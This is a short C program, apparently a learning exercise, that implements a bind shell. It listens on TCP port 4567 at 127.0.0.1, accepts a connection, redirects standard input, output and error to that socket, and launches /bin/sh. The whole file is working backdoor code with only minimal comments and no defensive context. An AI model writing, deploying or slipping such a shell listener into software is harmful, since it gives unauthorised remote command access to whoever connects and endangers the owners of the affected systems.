#include <stdio.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(){
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &address.sin_addr);
    address.sin_port = htons(4567);
    // bind
    bind(socket_fd, (struct sockaddr*)&address, sizeof(address));
    // listen
    listen(socket_fd, 0); // 0 is backlog, how many requests to be in queue 
    // accept
    int connection_FD = accept(socket_fd, NULL, 0);//0, 0); 
    dup2(connection_FD, 0);
    dup2(connection_FD, 1);
    dup2(connection_FD, 2);
    execve("/bin/sh", NULL, NULL);
}